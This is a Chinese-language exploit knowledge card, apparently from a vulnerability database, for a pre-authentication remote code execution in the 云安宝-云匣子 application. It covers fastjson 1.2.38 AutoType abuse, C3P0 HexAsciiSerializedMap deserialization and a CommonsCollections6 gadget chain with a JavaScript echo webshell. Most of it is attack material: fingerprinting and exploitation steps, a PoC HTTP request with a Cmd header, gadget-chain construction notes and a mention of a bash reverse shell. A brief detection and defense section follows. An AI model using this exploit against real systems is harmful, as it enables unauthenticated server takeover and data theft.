---
id: web-java-component-yunxiabox-authservice-config-fastjson-c3p0-hex-rce
title: 云安宝-云匣子 /3.0/authService/config 登录前拦截器 fastjson 1.2.38 AutoType → C3P0 userOverridesAsString Hex 反序列化（CC6+ScriptEngineManager 回显）RCE
type: scenario
domain: web
path: web/java/component
technique: yunxiabox-authservice-fastjson-c3p0-hex-rce
aliases:
- 云匣子 RCE
- 云安宝 云匣子
- /3.0/authService/config
- yunxiazi fastjson
- com.yunanbao.yunxiazi
- C3P0 HexAsciiSerializedMap 回显马
- RequestBodyHandlerInterceptor parseObject
tags:
- java
- fastjson
- c3p0
- deserialization
- rce
- spring-boot
- yunxiazi
- yunanbao
- auth-service
cve: []
severity: critical
confidence: high
affected_versions: 原文标注：fastjson 1.2.38、c3p0 0.9.1/0.9.2（云匣子 Spring Boot 应用依赖清单，截图同时含两者）
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V523
  verified_at: '2026-11-11T13:57:46+08:00'
  notes: 已对照原文全文与全部 43 张截图核对（均经 img_small 降采样 JPEG，无失败）。版本核对：正文明确“用的是fastjson1.2.38”；图39 依赖清单同时红框标出 c3p0-0.9.1.jar 与 c3p0-0.9.2.jar，并有 fastjson-1.2.38.jar、commons-collections-3.2.1.jar、commons-collections4-4.1.jar，故受影响版本表述修正为 fastjson 1.2.38、c3p0 0.9.1/0.9.2（原卡只写 0.9.2，遗漏同时存在的 0.9.1；正文作者本地分析环境用的是 c3p0 0.9.5.2，见 image 18/30/34 依赖树，与目标产品依赖不同）。入口核对：图35 spring-servlet.xml 中 LicenseCheckHandlerInterceptor 与权限拦截器 mapping /3.0/** 均 exclude /3.0/authService/**；图37 RequestBodyHandlerInterceptor mapping /3.0/authService/**；图38 preHandle readBody→processBody→JSONObject.parseObject(body) 取 c/b，卡片描述一致。Hex 链核对：图23-26 构造函数/parseUserOverridesAsString/substring(HASM_HEADER+1,len-1)/fromHexAscii/fromByteArray/deserializeFromByteArray readObject，图31-33 setUserOverridesAsString→fireVetoableChange→vetoableChange→parseUserOverridesAsString，图25 HASM_HEADER=HexAsciiSerializedMap，均与卡片一致。回显链核对：图40 为真实 POST /3.0/authService/config（两段式 @type + HexAsciiSerializedMap）响应 200，终端 DNSLog 与 nc 收到 curl UA 的 HTTP 请求，证明命令执行；图41
    ser-dump 显示 InvokerTransformer、nashorn:mozilla_compat.js、Unsafe.defineClass/defineAnonymousClass；图42 为 CC1-CC6 流程图；图43 为回显马源码（RequestContextHolder/RequestAttributes 取 Cmd 头，Runtime.exec 后把 stdout 经 response writer 返回），卡片 CC6+ScriptEngineManager 回显链描述成立。修正内容（knowledge 卡与 staging 草稿同步）：1) 一句话结论与触发条件的 c3p0 0.9.2 改为 0.9.1/0.9.2（依赖清单同时含两者），AutoType 表述由“可用”改为“校验可被两段式 @type 绕过”；2) 原理两段式 @type 的“规避 1.2.47 前后差异”改为“类缓存预置技巧在 1.2.47 前后常见、本 1.2.38 目标实测同样生效”。affected_versions 已同步 set-versions。去重：dedup 首位为自身，最近候选为 verified 的通用原语卡 web-java-deser-fastjson-c3p0-hex-useroverrides（仅 C3P0 Hex sink，无产品入口/1.2.38 两段式/回显链）及 1.2.47 内存马卡等，均非同链；库内无其他云匣子/yunxiazi 卡；dup-scan 无涉及 pair。跳过项（URLClassLoader/JNDI/Hex 原语/Tomcat8 不出网/1.2.47 绕过）所引既有卡均存在（其中 1247-class-cache-bypass 为 draft，其余 verified），跳过成立，needs_extraction=false。worker 笔记中“反弹 shell 成功”实为 nc 收到 curl 回连的 GET 请求（命令执行证明），卡片本身未作此表述。路径 web/java/component 在 taxonomy 中。未实测 PoC（无目标环境）；未 commit/finalize/index/embed。
---

## 一句话结论

云安宝-云匣子（`com.yunanbao.yunxiazi`）的 Spring Boot 应用把 `/3.0/authService/**` 排除在 License 与权限校验之外，登录前的 `RequestBodyHandlerInterceptor.preHandle()` 会读取并 `JSONObject.parseObject(body)`；其依赖 fastjson 1.2.38（AutoType 校验可被两段式 @type 绕过）与 c3p0 0.9.1/0.9.2（依赖清单同时含两者），攻击者 POST 两段式 `@type` JSON（`java.lang.Class` 预置 + `WrapperConnectionPoolDataSource.userOverridesAsString=HexAsciiSerializedMap:<hex>;`）即可触发 C3P0 原生反序列化，hex 内 CC6 链加载 ScriptEngineManager 执行 JS 回显马，未登录 RCE。

## 原理

- **入口无需认证**：`spring-servlet.xml` 中 `LicenseCheckHandlerInterceptor`、权限拦截器的 `mvc:mapping path="/3.0/**"` 都把 `/3.0/authService/**` 放进 `exclude-mapping`；`RequestBodyHandlerInterceptor` 对 `/3.0/authService/**` 在登录前处理 body（注释“处理登录前的请求，不用解密”），其 `preHandle` 先 `readBody`、`processBody`，再用 fastjson 的 `JSONObject.parseObject(body.toString())` 取 `c`/`b` 放进 request attribute——用户可控 body 在鉴权之前就被 fastjson 解析。
- **fastjson 1.2.38 的 AutoType 校验可绕过**：依赖清单为 `fastjson-1.2.38.jar`（图39），该版本黑名单不全，配合下一段的两段式 `@type` 即可实例化 `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource` 并调用其 setter。
- **两段式 @type**：payload 先用 `{"a":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"}}` 把目标类加载进 fastjson 的类缓存（类缓存预置技巧在 1.2.47 前后常见，本 1.2.38 目标实测同样生效），第二段 `{"b":{"@type":"...WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:<hex>;"}}` 触发 setter。
- **C3P0 Hex 反序列化**：`WrapperConnectionPoolDataSourceBase#setUserOverridesAsString` 发生属性变更 → `fireVetoableChange` → `WrapperConnectionPoolDataSource#vetoableChange` 中 `"userOverridesAsString".equals(propName)` 分支 → `C3P0ImplUtils.parseUserOverridesAsString()`：去掉头部 `HexAsciiSerializedMap` 与末尾 `;`，`ByteUtils.fromHexAscii` 还原字节，`SerializableUtils.fromByteArray` → `deserializeFromByteArray` → `ObjectInputStream.readObject()`，在目标侧执行原生反序列化。
- **hex 内的 CC6+JS 回显链**：ser-dump 可见 `TiedMapEntry`/`LazyMap`/`ChainedTransformer`/`ConstantTransformer`/`InvokerTransformer`（CommonsCollections 3.2.1）；链为 `ConstantTransformer(ScriptEngineManager.class)` → `InvokerTransformer("newInstance")` → `getEngineByName("js")` → `eval(JS)`。JS 代码用 `Unsafe.defineClass/defineAnonymousClass` 定义恶意类，恶意类通过 Spring `RequestContextHolder` 拿到当前请求的 `Cmd` 头执行命令，并把 stdout 写回 response——因此无需回连、直接 HTTP 回显。
- **为什么用 Hex 而不是 URLClassLoader/JNDI**：URLClassLoader/JNDI 链需要目标出网或可写字节码；Hex 链把序列化字节内嵌在请求里，目标只需 classpath 有 c3p0 + CommonsCollections，配合回显马即可在隔离网络中直接执行。

## 触发条件

- 目标为云匣子（云安宝）Spring Boot 应用，依赖清单为 fastjson 1.2.38 与 c3p0 0.9.1/0.9.2（截图同时含两者；classpath 同时有 commons-collections 3.2.1）。
- `/3.0/authService/config` 可被攻击者访问（该前缀被排除在 License/权限校验外）。
- 请求体可达 fastjson `parseObject`（登录前拦截器或控制器）。
- 目标 JDK 8（原文 8u65），JS 引擎/Nashorn 可用。

## 利用步骤

1. 指纹：访问 `/3.0/authService/` 相关路径，确认云匣子/云安宝应用与 `/3.0/authService/config` 存在。
2. 构造 C3P0 Hex payload：用 ysoserial/自写 CC6 生成 `ConstantTransformer(ScriptEngineManager.class)+InvokerTransformer(newInstance/getEngineByName("js")/eval)` 的序列化字节，转十六进制；JS 内容为读取 `Cmd` 请求头、`Runtime.exec` 执行并把输出写回响应。
3. 组装两段式 fastjson JSON（见 PoC），hex 放在 `HexAsciiSerializedMap:<hex>;` 中；通过 `POST /3.0/authService/config` 发送，`Content-Type: application/json`，把要执行的命令放在 `Cmd` 请求头。
4. 响应体即命令输出（回显马）；先用 `Cmd: id`/`whoami` 验证，再执行后续命令。
5. 不出网环境同样可用（hex 内嵌、无远程类加载）；如需反弹 shell 也可用 JS 调 `Runtime.exec` 或 `bash -i`。

## PoC

```http
POST /3.0/authService/config HTTP/1.1
Host: target
Content-Type: application/json
Cmd: id

{"a":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"b":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:<CC6+ScriptEngineManager+回显JS 的十六进制>;"}}
```

```text
hex 生成要点：
1) 构造 CommonsCollections6：TiedMapEntry(LazyMap(ChainedTransformer([
     ConstantTransformer(ScriptEngineManager.class),
     InvokerTransformer("newInstance", [], []),
     InvokerTransformer("getEngineByName", [String], ["js"]),
     InvokerTransformer("eval", [String], [<JS 回显马>])
   ])), "abc") 放入 HashMap；
2) ObjectOutputStream 序列化后逐字节转 hex；
3) 前缀 HexAsciiSerializedMap:，结尾补 ;（C3P0 会截掉首部 header 和最后 1 个字符）。
JS 回显马通过 RequestContextHolder 读取 Cmd 请求头、Runtime.exec 执行并写回 response。
```

## 变体与关联

- 变体：hex 内换其他 CommonsCollections gadget（CC1/CC5 等）或 TemplatesImpl/字节码加载链；回显也可改为反连。
- 变体：若目标 fastjson 版本更高，可先利用 `java.lang.Class` 缓存/黑名单绕过（对应库内 1.2.47 缓存绕过卡）。
- 关联：[[web-java-deser-fastjson-c3p0-hex-useroverrides]]（C3P0 Hex 反序列化原语）、[[web-java-deser-fastjson-1247-c3p0-templatesimpl-memshell]]（缓存绕过 + C3P0 Hex 内存马）、[[web-java-deser-fastjson-1247-class-cache-bypass]]（两段式 @type 的缓存绕过）、[[web-java-deser-c3p0-poolbackeddatasourcebase-urlclassloader]]（C3P0 的另一条 URLClassLoader 链）。
- 边界：fastjson 升级到 SafeMode/关闭 AutoType、c3p0 或 CommonsCollections 不在 classpath、`/3.0/authService/**` 被网关拦截时利用失败。

## 检测与防御

- 检测：`/3.0/authService/config` 等登录前接口出现 `@type`、`java.lang.Class`、`WrapperConnectionPoolDataSource`、`HexAsciiSerializedMap` 特征；请求带 `Cmd` 等自定义命令头；响应体出现命令输出；fastjson 解析异常日志中出现 c3p0 类名。
- 防御：升级 fastjson（1.2.83+ SafeMode 或迁移 fastjson2 并关闭 AutoType）；升级/移除不必要的 c3p0 与 CommonsCollections 依赖；对 `/3.0/authService/**` 的 body 解析做白名单（只接受预期字段），禁止在鉴权前解析不可信 JSON；网关层拦截含 `@type` 的请求。
- 加固：对登录前接口做最小化处理（只按 schema 取值，不反序列化任意类型），并加 WAF 规则与异常解析审计。
